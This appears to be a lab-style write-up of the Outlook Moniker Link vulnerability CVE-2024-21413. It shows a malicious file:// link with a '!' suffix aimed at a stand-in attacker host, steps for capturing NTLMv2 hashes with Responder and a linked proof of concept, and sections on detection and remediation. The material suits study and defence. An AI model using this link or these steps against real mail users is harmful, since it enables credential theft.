# CVE-2024-21413 — Moniker Link (Outlook NTLM Leak)

## 🔍 Overview

| Detail | Info |
|--------|------|
| **CVE** | CVE-2024-21413 |
| **Target** | Microsoft Outlook |
| **Impact** | NTLM credential theft via malicious hyperlink |
| **PoC** | [github.com/CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413) |

### How It Works

Outlook has a **Protected View** security mechanism that restricts dangerous links. This vulnerability bypasses it using a **Moniker Link** — a special hyperlink format.

By appending `!` and arbitrary text to a `file://` UNC path, the attacker tricks Outlook into bypassing Protected View. When the victim clicks the link, Outlook automatically sends their **NTLMv2 credentials** to the attacker's machine.

**Normal (blocked) link:**
```html
<a href="file://attacker_machine/test">click me</a>
```

**Malicious Moniker Link (bypasses Protected View):**
```html
<a href="file://attacker_machine/test!exploit">click me</a>
```

The `!exploit` suffix is the bypass — the `!` character and any text after it cause Outlook to skip its usual security check.

---

## ⚔️ Exploitation Process

### Step 1 — Start Responder (captures NTLM hashes)

```bash
responder -I ens5
```

**If Responder fails to start (port 445 blocked):**
```bash
Ctrl+C                          # Stop Responder
sudo ss -tlnp | grep 445        # Find the process blocking port 445
kill <PID>                      # Kill the blocking process
responder -I ens5               # Start Responder again
```

### Step 2 — Set Up the Exploit

```bash
# Create exploit file
nano exploit.py

# Paste the PoC from https://github.com/CMNatic/CVE-2024-21413
# Modify the options (attacker IP, target email, SMTP settings etc.)
```

### Step 3 — Execute

```bash
python3 exploit.py
```

### Step 4 — Trigger & Capture

1. Victim receives and clicks the malicious link in the email
2. Return to Responder terminal to retrieve the captured **NTLMv2 hash**

---

## 🔎 Detection

| Method | Description |
|--------|-------------|
| **YARA rule** | Detects emails containing `file:\\` element in a Moniker Link |
| **Wireshark** | SMB request visible from victim to attacker machine, containing a truncated NTLMv2 hash |

```bash
cat cve-2024-21413.yar    # View the YARA detection rule
```

---

## 🛡️ Remediation

| Action | Description |
|--------|-------------|
| Patch systems | Apply Microsoft security updates — this CVE has an official patch |
| Link hygiene | Do not click unverified links — hover to preview the URL before clicking |
| Report | Forward suspicious emails to the security/IT department |
